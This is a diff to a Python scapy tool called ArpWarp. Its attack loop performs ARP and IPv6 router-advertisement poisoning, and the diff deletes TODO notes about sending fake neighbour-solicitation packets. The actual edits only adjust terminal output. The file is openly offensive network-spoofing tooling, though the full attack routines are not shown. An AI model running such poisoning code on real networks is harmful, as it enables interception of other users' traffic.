@@ -1,18 +1,13 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
-import ipaddress  # TODO req
+import ipaddress
 
+from sys import platform
 from scapy.all import *
 from utils import *
 
 conf.verb = 0
-
-# TODO test on ipv6 at home
-# TODO refresh ipv6 scans for new devices
-# TODO why only joannas iphone doesnt convert? (ans: fake mac? or: ans: diferent preflix)
-
-# TODO NEWEST: require kali -> ping6 -> gather hosts -> get gateway -> fake NS packets
 
 #   --------------------------------------------------------------------------------------------------------------------
 #
@@ -124,8 +119,9 @@ class ArpWarp:
     def start_attack(self):
         loop_count = 0
         print(DELIM)
-        print("")
-        print("")
+        if "linux" in platform:
+            print("")
+            print("")
         while not self.abort:
             try:
                 loop_count += 1
@@ -135,7 +131,8 @@ class ArpWarp:
                     if loop_count % ArpWarp._IPV6_REFHOSTS_INTV:  # periodically refresh IPv6 hosts
                         self.host_ipv6s = self.get_all_hosts_ipv6()
                     self.poison_ra()
-                print(2 * "\x1b[1A\x1b[2K")
+                if "linux" in platform:
+                    print(2 * "\x1b[1A\x1b[2K")
                 print(f"[+] attacking" + f"cycle #{str(loop_count)} duration {get_ts_ms() - now}[ms]".rjust(36))
                 time.sleep(self.arp_poison_interval)
             except Exception as exc:
@@ -146,8 +143,6 @@ class ArpWarp:
                 print(DELIM)
                 print(f"[-] User requested to stop...")
                 self.abort = True
-
-
 
     @staticmethod
     def get_gateway_ipv4(iface):
